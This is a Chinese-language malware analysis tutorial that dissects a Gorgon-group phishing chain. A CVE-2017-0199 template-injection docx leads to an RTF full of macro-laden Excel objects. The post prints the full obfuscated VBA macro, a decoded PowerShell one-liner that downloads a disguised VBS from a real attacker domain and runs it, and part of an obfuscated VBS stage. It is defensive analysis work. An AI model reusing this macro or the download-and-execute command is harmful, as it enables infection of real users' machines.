> 原文链接: https://www.anquanke.com//post/id/209949 


# 非PE恶意代码分析之Gorgon组合拳


                                阅读量   
                                **129133**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01aa69a859eccb9df9.png)](https://p2.ssl.qhimg.com/t01aa69a859eccb9df9.png)



## 0x00 前言

在上一小节，我们分析了两个简单的office宏样本，也算是对非PE的攻击样本有了一个大概的了解，在本小节中，我们将分析一个Gorgon组织的样本，该样本通过VBA、powershell、VBS等方式进行组合攻击。算是目前非PE攻击中玩的比较溜的。

通过VT我们可以知道，该样本上传于2019年12月，文件类型为docx，上传文件名为：Cronograma Executivo – Reservas (1).docx<br>
译为中文大概是：储备执行计划.docx

光从文件名上，我们不能很好的分析该文件的攻击背景和目标等。

[![](https://p2.ssl.qhimg.com/t01ef24f4193758a598.png)](https://p2.ssl.qhimg.com/t01ef24f4193758a598.png)

样本MD5为，85e12cab0cf1f599007e693e66f42de8

app.any.run下载连接为：[https://app.any.run/tasks/a7803beb-d5a3-44a2-a928-9ab6c7552ee3/](https://app.any.run/tasks/a7803beb-d5a3-44a2-a928-9ab6c7552ee3/)

此外，通过VT我们可以得知该样本是CVE-2017-0199漏洞的利用文档，通过对该漏洞的搜索，可以得知该样本将会通过模板注入的方式进行攻击。<br>
原本的大概执行流程如下。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e26ed7c71dda904c.png)



## 0x01 原始样本

将原始样本下载到本地，在虚拟机中添加docx后缀并打开该文档可以看到如下的内容：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a7124b3f85a72ac5.png)

这是通过模板注入的漏洞，在文档打开的时候从指定的地址下载文件并加载执行。

这里可以看到，注入的地址是https[:]//gritodopovo.com.br/natalidade/new.wiz

需要注意，模板注入类的Office文档，这里的注入地址只会显示一次，之后再次打开该文档将不会再显示该注入地址。所以针对模板注入类的office文档分析，我们可以在打开的时候进行截图，保留下该注入地址。

也可以通过类似7z的压缩软件对该docx文档进行解压缩。

因为2007版本之后的office文件的本质就是一个压缩包，所以我们通过7z打开文档可以看到如下的内容：

[![](https://p4.ssl.qhimg.com/t01e440435e6961a075.png)](https://p4.ssl.qhimg.com/t01e440435e6961a075.png)

通常来说，注入的地址应该在word文件夹下的_rels文件夹下的文件中

[![](https://p4.ssl.qhimg.com/t01b4992206fc6f4ff7.png)](https://p4.ssl.qhimg.com/t01b4992206fc6f4ff7.png)

在该样本中是在header1.xml.rels文件中：

[![](https://p4.ssl.qhimg.com/t01dc3e903f35f80068.png)](https://p4.ssl.qhimg.com/t01dc3e903f35f80068.png)

找到了模板注入的地址，我们来看看原始的文档内容，文档打开之后用于迷惑用户的内容是一张不完全的图片（攻击者是有点不太走心。。）

[![](https://p4.ssl.qhimg.com/t012b8f4795065ef095.png)](https://p4.ssl.qhimg.com/t012b8f4795065ef095.png)

首先，文档内容应该是来源于某个正常文档的截图，可能是因为格式方面的原因，攻击者直接以截图的形式放到文档中，在文档左上角，有一个人头，并且备注是Valter Oliveira da Silva Director Executive，表示Valter Oliveira da Silva的执行董事，我们对Valter Oliveira da Silva进行查询：

[![](https://p2.ssl.qhimg.com/t019fce61c610c314d3.png)](https://p2.ssl.qhimg.com/t019fce61c610c314d3.png)

经过筛选可以得知Valter Oliveira da Silva应该是位于巴西的建筑公司。所以可以初步推测，该样本是针对巴西建筑商/与建筑行业相关客户公司的攻击事件。

[![](https://p4.ssl.qhimg.com/t011c53fca784a2019a.png)](https://p4.ssl.qhimg.com/t011c53fca784a2019a.png)



## 0x02 模板注入的文档

我们在VT上搜索模板注入的地址可以看到六个月前是可以正常的请求的，但是很可惜，这里的Body内容VT上没有保存，于是我们只能自己尝试获取该内容了，好消息是，样本虽然已经发布了半年多，但目前还是可以正常访问请求地址的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bd4590557471e211.png)

使用笔记本，连接手机热点网络，使用浏览器或python访问该地址，下载对应的文件到本地继续分析。

为了方便我是直接在chrome中请求该地址的，可以要下载的实际上是一个rtf文档。

[![](https://p1.ssl.qhimg.com/t018f6981e116b10393.png)](https://p1.ssl.qhimg.com/t018f6981e116b10393.png)

### <a class="reference-link" name="rtf%E6%96%87%E6%A1%A3%E5%88%86%E6%9E%90"></a>rtf文档分析

将整段内容保存到本地，在虚拟机中添加rtf后缀并打开。

rtf文档打开之后，弹框显示了excel的界面并且提示用户启用宏代码：

[![](https://p1.ssl.qhimg.com/t0129c4e17a713dfb68.png)](https://p1.ssl.qhimg.com/t0129c4e17a713dfb68.png)

这里无论单击启用宏还是禁用宏，都会继续弹框显示，这是Gorgon组织一个比较常见的攻击手法，即模板注入一个内嵌了多个带有旧版宏警告的Excel ole对象。关于该技术细节，有机会可以在后面的文章中进行介绍。

此处单击之后，会弹框显示如下内容：

[![](https://p5.ssl.qhimg.com/t0181a02a6b37657249.png)](https://p5.ssl.qhimg.com/t0181a02a6b37657249.png)

每次弹框之后，进度条都会前进一点：

[![](https://p5.ssl.qhimg.com/t01b8ffc137a65e670f.png)](https://p5.ssl.qhimg.com/t01b8ffc137a65e670f.png)

此处一共弹框了12次，说明该rtf包含了12个旧版本的excel ole对象。

12次弹框解释之后，rtf文档显示内容如下：

[![](https://p4.ssl.qhimg.com/t0188694422cfb86316.png)](https://p4.ssl.qhimg.com/t0188694422cfb86316.png)

这里的12个表格，实际上就是12个内嵌的excel ole对象。

我们选中第一个表格，然后双击以打开该对象，双击之后会重新弹框，这里选择启用宏

[![](https://p2.ssl.qhimg.com/t01d70e3547fb8da697.png)](https://p2.ssl.qhimg.com/t01d70e3547fb8da697.png)

启用之后可以看到文档内容显示如下：

[![](https://p2.ssl.qhimg.com/t018c747a853c28cfd6.png)](https://p2.ssl.qhimg.com/t018c747a853c28cfd6.png)

此时我们按下Alt +F11，在左侧的对象窗口中可以看到对应的宏代码

[![](https://p5.ssl.qhimg.com/t01a02c901998858159.png)](https://p5.ssl.qhimg.com/t01a02c901998858159.png)

### <a class="reference-link" name="Macro%E5%AE%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>Macro宏代码分析

接下来我们对该段VBA宏代码进行调试。通常来说，我们可以直接在宏窗口中对该段代码进行调试，但是为了让我们能够更清楚的明白程序在做什么，我们可以将代码拷贝出来先静态分析一下。

完整代码如下：

```
Private Sub Workbook_Open()
'MsgBox'MsgBox'MsgBox'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox
'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox

Dim VEC  As String
Dim Tmp As String
Dim s As String
Dim i As Integer
Dim ST As String
Dim colVariabili As New Collection



Tmp = "s1=272728656E616273697242272B276C6946272B2764616F272B276C6E272B27776F442E272B2729746E656E616273697242272B27696C43272B2762656E61627369724257272B272E74656E6162736972424E27202B27292A4F2D572A20272B274D4347282628273B736E696172545254242072656E6162736972427473614D206C6173203B292749272C272D2A2E2A2728656E61627369724263616C70656E616273697242722E2758452D2A2E2A273D736E69617254525424206C6C656E616273697242687372656E616273697242776F736E69617254/\/s2=29277362762E6E6F64656E61627369724267616D7261272B275C272B41544144736E69617254736E69617254413A766E656E61627369724224287373656E616273697242636F72702D7472617473203B72656E6162736972427473614D7C272927277362762E6E6F64656E61627369724267616D726127272B27275C27272B41544144736E69617254736E69617254413A766E656E616273697242242C272733706D2E32306F7263616D2F656E616273697242646164696C6174616E2F72622E6D6F632E6F766F706F646F746972672F2F3A734F4B2E4C"
Dim FieldStr() As String
Dim FieldSplitStr() As String
FieldStr = Split(Tmp, "/\/")

For Each xx In FieldStr
    FieldSplitStr = Split(xx, "=")
    colVariabili.Add FieldSplitStr(1), FieldSplitStr(0)
Next
ST = rev(colVariabili("s1")) + rev(colVariabili("s2"))
VEC = rev(sHexDecode(rev(ST)))
VEC = rep(VEC, "L.KO", "http")
VEC = rep(VEC, "Brisbane", "e")
VEC = rep(VEC, "Trains", "P")

k = rep("Wscr#######ll", "#######", "ipt.she")

Dim objOL
    Set objOL = CreateObject(rep("#######.Application", "#######", "Outlook"))
    Set shellObj = objOL.CreateObject(k)
 cd = shellObj.Run(VEC, 0)

End Sub
Public Function sHexDecode(sData As String) As String
 Dim iChar As Integer
 Dim sOutString As String
 Dim sTmpChar As String
 For iChar = 1 To Len(sData) Step 2
sTmpChar = Chr("&amp;H" &amp; Mid(sData, iChar, 2))
sOutString = sOutString &amp; sTmpChar
 Next iChar
 sHexDecode = sOutString
End Function
Function rep(Str As String, tr As String, rep1 As String) As String
Dim RegX
XO = rev("pxEgeR.tpircSBV")
Set RegX = CreateObject(XO)
Dim MyString, SearchPattern, ReplacedText
MyString = Str
SearchPattern = tr
ReplaceString = rep1
RegX.Pattern = SearchPattern
RegX.Global = True
ReplacedText = RegX.Replace(MyString, ReplaceString)
rep = ReplacedText
End Function
Function rev(Str As String)
For i = Len(Str) To 1 Step -1
    Var = Mid(Str, i, 1)
    reverseString = reverseString &amp; Var
Next
rev = reverseString
End Function
```

拆解一下该段代码，首先是定义了一个Workbook_open()的方法，结合我们之前分析的内容，这里应该是用于在打开文档时进行弹框，让用户无法进行其他操作。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f1cd381c35c948ad.png)

接下来程序通过Dim定义了几个变量。

[![](https://p3.ssl.qhimg.com/t01c5cbac0808a599b6.png)](https://p3.ssl.qhimg.com/t01c5cbac0808a599b6.png)

程序将从22行的地方开始正式执行，首先是将一个超级长的串赋值给了Tmp，从串的内容中我们可以看到该串实际上包含了两个子串，一个是s1，一个是s2.

[![](https://p2.ssl.qhimg.com/t010ab978f304346b18.png)](https://p2.ssl.qhimg.com/t010ab978f304346b18.png)

Tmp赋值之后，程序新定义了两个变量，其中FiledStr用于分割Tmp变量，分割的值是 “//“ 从图中可以看到，这里分割之后，FiledStr实际上就等于s1<br>
然后通过一个for each循环来操作FieldStr(s1)

操作的方法是以 “=” 分割并赋值给FieldSplitStr

分割完成之后，程序分别将FieldSplitStr(1) 和FieldSplitStr(0)添加到了colVariabili中，根据之前

Dim colVariabili As New Collection

的定义可以得知colVariabili是一个集合。

成功添加到colVariabili集合之后，程序会调用rev分别对colVariabili(“s1”)和colVariabili(“s2”)进行处理然后赋值给ST

rev函数的具体实现最代码最后：

[![](https://p3.ssl.qhimg.com/t01ae04b5f220ce8167.png)](https://p3.ssl.qhimg.com/t01ae04b5f220ce8167.png)

可以看到，rev函数的实现很简单，就是遍历参数，然后通过Mid运算进行翻转。回到上面rev调用的地方继续往下看。

[![](https://p1.ssl.qhimg.com/t01bd50d47c06b0ab99.png)](https://p1.ssl.qhimg.com/t01bd50d47c06b0ab99.png)

ST赋值完成之后，程序会再将ST传给rev函数进行转换，然后将转换后的值传递给sHexDecode函数进行运算，最后将运算后的值再次传递给rev函数转换后赋值给VEC变量。

然后VEC将自身加上一些其他参数，三次调用rep函数，现在我们分别查看一下sHexDecode函数和rep函数。

首先是sHexDecode函数，从命名上我们也可以大概才出来是将s(string)转换为Hex的函数：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e2a2d4134a8804a5.png)

然后是rep函数，rep函数相对来说比较复杂，我们可以大概看一下，也可以直接调试看该函数运行后的结果。

[![](https://p3.ssl.qhimg.com/t015db7439bcec35cbd.png)](https://p3.ssl.qhimg.com/t015db7439bcec35cbd.png)

我们这里可以看到，程序首先会执行

XO = rev(“pxEgeR.tpircSBV”)

翻转得到：VBScript.RegExp赋值给XO

然后通过CreateObject(XO)创建一个VBScript.RegExp对象为RegX。

通过查询可以得知，这是一个VBS的正则表达式对象。

其中Pattern参数用于设置或返回被搜索的正则表达式模式。

如果Global属性的值是True，那就会对整个字符串进行查找。

在此样本中是True。

然后程序通过Dim MyString, SearchPattern, ReplacedText声明了三个变量，并且随后将参数赋值给它们。

最后，程序通过

ReplacedText = RegX.Replace(MyString, ReplaceString)

对字符串进行替换，并且将替换之后的字符串返回回去。

rep函数也执行完成。

最后，程序通过shellObj.Run的方式执行VEC，整个VBA代码执行结束。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d64dabc011a40e29.png)

现在，我们已经完全搞清楚了该VBA代码的执行流程，我们可以很好的在调试器中对它进行调试了。

回到office的宏代码调试器中，将光标定位到代码窗口中，然后直接按下F8，程序就会默认停在该段VBA的入口点：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01227811dd9a5132aa.png)

然后我们在视图菜单栏中调出本地窗口，方便我们观察代码运行时的值。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e01853d192eddd5c.png)

然后就F8单步往下走，当运行到ST赋值这一行的时候，由于我们已经知道rev函数的功能，且rev函数中的循环会跑很多次，所以我们这里就不需要按F8，而是shift + F8， shift + f8的功能有点类似od中的F8,就不会进入函数，而是会直接执行完函数。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0165fcac30d224df25.png)

shift + F8单步运行之后，ST成功赋值

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015042810527ecf2df.png)

然后再后面VEC的赋值中，也shift + F8往下走，三次赋值操作执行完之后，可以看到VEC好像解密出来了一个powershell指令。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013014ca1dbcf31ace.png)

我们将指令提取出来如下：

```
"Powershell $TRP='*.*-EX'.replace('*.*-','I'); sal Master $TRP;'(&amp;(GCM'+' *W-O*)'+ 'Net.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''https://gritodopovo.com.br/natalidade/macro02.mp3'',$env:APPDATA+''''+''armagedon.vbs'')'|Master; start-process($en"
```

然后解密k为Wscript.shell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f9aabaa7dd4f4478.png)

最后通过Wscript.shell执行我们上面看到的powershell指令。

### <a class="reference-link" name="powershell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>powershell代码分析

现在我们来分析一下这段powershell指令。

为了方便阅读，我将这段powershell分段显示

```
"Powershell $TRP='*.*-EX'.replace('*.*-','I'); 
sal Master $TRP;
'(&amp;(GCM'+' *W-O*)'+ 'Net.'+'Web'+'Cli'+'ent)'
+'.Dow'+'nl'+'oad'+'Fil'+'e(''https://gritodopovo.com.br/natalidade/macro02.mp3'',
$env:APPDATA+''''+''armagedon.vbs'')'|Master; start-process($en"
```

此段powershell的代码非常简单，就是通过一些字符串的拼接和替换，执行一条WebCLient.DownloadFile hxxps[:]//gritodopovo.com.br/natalidade/macro02.mp3 的指令下载macro02.mp3文件并保存到本地的%APPDATA%目录下，保存名为armagedon.vbs，接着程序通过start-process的方式启动该vbs脚本。

### <a class="reference-link" name="Macro02.mp3%E5%88%86%E6%9E%90(armagedon.vbs)"></a>Macro02.mp3分析(armagedon.vbs)

还是使用之前的方式，我们首先通过安全的网络尝试对该地址进行请求，可以看到的确有一个”mp3”文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d59e561df4eb1c53.png)

打开开发者工具，找到NetWork，重新请求，可以看到mp3文件的返回值是206，206的返回值表示该文件是需要用户交互才能下载的文件，所以我们直接选中该文件，然后右键，选择 copy -&gt; copy response 复制该段数据：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d1a81f3a15d72c8b.png)

copy的值是一段base64编码的数据，我们直接通过在线工具对该段base64数据进行解码，可以看到，解码之后的确是一段VBS脚本代码:

```
f="XEI|'' nioj- HKGhjkghjKGhjkjKGJK$]][rahc[;)14,601,89,@#_**CooperANDsteal||1,63,44,601,63,04,101,701,@#_**CooperANDsteal||1,8@#_**CooperANDsteal||,0@#_**CooperANDsteal||,37,64,121,63,95,14,801,801,7@#_**CooperANDsteal||,0@#_**CooperANDsteal||,63,44,05,05,301,63,04,101,99,0@#_**CooperANDsteal||,79,6@#_**CooperANDsteal||,5@#_**CooperANDsteal||,0@#_**CooperANDsteal||,37,101,6@#_**CooperANDsteal||,79,101,4@#_**CooperANDsteal||,76,85,85,39,4@#_**CooperANDsteal||,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,79,8@#_**CooperANDsteal||,501,6@#_**CooperANDsteal||,99,56,19,16,601,63,95,14,93,901,@#_**CooperANDsteal||1,86,101,101,4@#_**CooperANDsteal||,07,93,04,001,@#_**CooperANDsteal||1,401,6@#_**CooperANDsteal||,101,77,6@#_**CooperANDsteal||,101,17,64,05,05,301,63,16,121,63,95,14,93,79,4@#_**CooperANDsteal||,79,8@#_**CooperANDsteal||,501,17,93,04,101,2@#_**CooperANDsteal||,121,48,6@#_**CooperANDsteal||,101,17,64,79,63,16,05,05,301,63,95,14,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,63,44,93,101,021,101,64,001,79,2@#_**CooperANDsteal||,101,6@#_**CooperANDsteal||,@#_**CooperANDsteal||1,0@#_**CooperANDsteal||,93,04,46,16,23,601,89,@#_**CooperANDsteal||1,63,95,88,96,37,421,14,93,021,84,93,44,93,64,64,93,04,101,99,79,801,2@#_**CooperANDsteal||,101,4@#_**CooperANDsteal||,64,14,93,15,2@#_**CooperANDsteal||,901,64,901,79,2@#_**CooperANDsteal||,5@#_**CooperANDsteal||,701,4@#_**CooperANDsteal||,79,001,74,101,001,79,001,501,801,79,6@#_**CooperANDsteal||,79,0@#_**CooperANDsteal||,74,4@#_**CooperANDsteal||,89,64,901,@#_**CooperANDsteal||1,99,64,@#_**CooperANDsteal||1,8@#_**CooperANDsteal||,@#_**CooperANDsteal||1,2@#_**CooperANDsteal||,@#_**CooperANDsteal||1,001,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,501,4@#_**CooperANDsteal||,301,74,74,85,5@#_**CooperANDsteal||,2@#_**CooperANDsteal||,6@#_**CooperANDsteal||,6@#_**CooperANDsteal||,401,93,44,001,@#_**CooperANDsteal||1,401,6@#_**CooperANDsteal||,101,77,85,85,39,101,2@#_**CooperANDsteal||,121,48,801,801,79,76,64,99,501,5@#_**CooperANDsteal||,79,66,801,79,7@#_**CooperANDsteal||,5@#_**CooperANDsteal||,501,68,64,6@#_**CooperANDsteal||,201,@#_**CooperANDsteal||1,5@#_**CooperANDsteal||,@#_**CooperANDsteal||1,4@#_**CooperANDsteal||,99,501,77,19,44,14,93,0@#_**CooperANDsteal||,93,44,93,63,59,63,93,04,101,99,79,801,2@#_**CooperANDsteal||,101,4@#_**CooperANDsteal||,64,93,301,63,59,63,501,4@#_**CooperANDsteal||,6@#_**CooperANDsteal||,38,001,79,@#_**CooperANDsteal||1,801,63,59,63,9@#_**CooperANDsteal||,@#_**CooperANDsteal||1,86,93,44,14,6@#_**CooperANDsteal||,0@#_**CooperANDsteal||,101,501,801,76,89,101,78,64,6@#_**CooperANDsteal||,101,87,23,6@#_**CooperANDsteal||,99,101,601,89,97,54,9@#_**CooperANDsteal||,101,87,04,04,101,901,79,0@#_**CooperANDsteal||,121,66,801,801,79,76,85,85,39,0@#_**CooperANDsteal||,@#_**CooperANDsteal||1,501,6@#_**CooperANDsteal||,99,79,4@#_**CooperANDsteal||,101,6@#_**CooperANDsteal||,0@#_**CooperANDsteal||,37,64,99,501,5@#_**CooperANDsteal||,79,66,801,79,7@#_**CooperANDsteal||,5@#_**CooperANDsteal||,501,68,64,6@#_**CooperANDsteal||,201,@#_**CooperANDsteal||1,5@#_**CooperANDsteal||,@#_**CooperANDsteal||1,4@#_**CooperANDsteal||,99,501,77,19,16,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,63,39,39,19,101,6@#_**CooperANDsteal||,121,66,19,95,88,96,37,421,14,93,301,2@#_**CooperANDsteal||,601,64,28,2@#_**CooperANDsteal||,7@#_**CooperANDsteal||,6@#_**CooperANDsteal||,4@#_**CooperANDsteal||,79,6@#_**CooperANDsteal||,38,79,8@#_**CooperANDsteal||,@#_**CooperANDsteal||1,87,08,0@#_**CooperANDsteal||,0@#_**CooperANDsteal||,7@#_**CooperANDsteal||,28,74,101,001,79,001,501,801,79,6@#_**CooperANDsteal||,79,0@#_**CooperANDsteal||,74,4@#_**CooperANDsteal||,89,64,901,@#_**CooperANDsteal||1,99,64,@#_**CooperANDsteal||1,8@#_**CooperANDsteal||,@#_**CooperANDsteal||1,2@#_**CooperANDsteal||,@#_**CooperANDsteal||1,001,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,501,4@#_**CooperANDsteal||,301,74,74,8"
f=f+"5,5@#_**CooperANDsteal||,2@#_**CooperANDsteal||,6@#_**CooperANDsteal||,6@#_**CooperANDsteal||,401,93,44,001,@#_**CooperANDsteal||1,401,6@#_**CooperANDsteal||,101,77,85,85,39,101,2@#_**CooperANDsteal||,121,48,801,801,79,76,64,99,501,5@#_**CooperANDsteal||,79,66,801,79,7@#_**CooperANDsteal||,5@#_**CooperANDsteal||,501,68,64,6@#_**CooperANDsteal||,201,@#_**CooperANDsteal||1,5@#_**CooperANDsteal||,@#_**CooperANDsteal||1,4@#_**CooperANDsteal||,99,501,77,19,44,14,93,0@#_**CooperANDsteal||,93,44,93,63,59,63,93,04,101,99,79,801,2@#_**CooperANDsteal||,101,4@#_**CooperANDsteal||,64,93,301,63,59,63,501,4@#_**CooperANDsteal||,6@#_**CooperANDsteal||,38,001,79,@#_**CooperANDsteal||1,801,63,59,63,9@#_**CooperANDsteal||,@#_**CooperANDsteal||1,86,93,44,14,6@#_**CooperANDsteal||,0@#_**CooperANDsteal||,101,501,801,76,89,101,78,64,6@#_**CooperANDsteal||,101,87,23,6@#_**CooperANDsteal||,99,101,601,89,97,54,9@#_**CooperANDsteal||,101,87,04,04,101,901,79,0@#_**CooperANDsteal||,121,66,801,801,79,76,85,85,39,0@#_**CooperANDsteal||,@#_**CooperANDsteal||1,501,6@#_**CooperANDsteal||,99,79,4@#_**CooperANDsteal||,101,6@#_**CooperANDsteal||,0@#_**CooperANDsteal||,37,64,99,501,5@#_**CooperANDsteal||,79,66,801,79,7@#_**CooperANDsteal||,5@#_**CooperANDsteal||,501,68,64,6@#_**CooperANDsteal||,201,@#_**CooperANDsteal||1,5@#_**CooperANDsteal||,@#_**CooperANDsteal||1,4@#_**CooperANDsteal||,99,501,77,19,16,601,201,63,95,14,93,99,501,5@#_**CooperANDsteal||,79,66,801,79,7@#_**CooperANDsteal||,5@#_**CooperANDsteal||,501,68,64,6@#_**CooperANDsteal||,201,@#_**CooperANDsteal||1,5@#_**CooperANDsteal||,@#_**CooperANDsteal||1,4@#_**CooperANDsteal||,99,501,77,93,04,101,901,79,87,801,79,501,6@#_**CooperANDsteal||,4@#_**CooperANDsteal||,79,08,401,6@#_**CooperANDsteal||,501,78,001,79,@#_**CooperANDsteal||1,67,85,85,39,121,801,89,901,101,5@#_**CooperANDsteal||,5@#_**CooperANDsteal||,56,64,0@#_**CooperANDsteal||,@#_**CooperANDsteal||1,501,6@#_**CooperANDsteal||,99,101,801,201,101,28,64,901,101,6@#_**CooperANDsteal||,5@#_**CooperANDsteal||,121,38,19,23,39,001,501,@#_**CooperANDsteal||1,8@#_**CooperANDsteal||,19,95,05,05,2@#_**CooperANDsteal||,63,23,16,23,801,@#_**CooperANDsteal||1,99,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,@#_**CooperANDsteal||1,4@#_**CooperANDsteal||,08,121,6@#_**CooperANDsteal||,501,4@#_**CooperANDsteal||,7@#_**CooperANDsteal||,99,101,38,85,85,39,4@#_**CooperANDsteal||,101,301,79,0@#_**CooperANDsteal||,79,77,6@#_**CooperANDsteal||,0@#_**CooperANDsteal||,501,@#_**CooperANDsteal||1,08,101,99,501,8@#_**CooperANDsteal||,4@#_**CooperANDsteal||,101,38,64,6@#_**CooperANDsteal||,101,87,64,901,101,6@#_**CooperANDsteal||,5@#_**CooperANDsteal||,121,38,19,95,14,05,55,84,15,23,44,39,101,2@#_**CooperANDsteal||,121,48,801,@#_**CooperANDsteal||1,99,@#_**CooperANDsteal||1,6@#_**CooperANDsteal||,@#_**Coop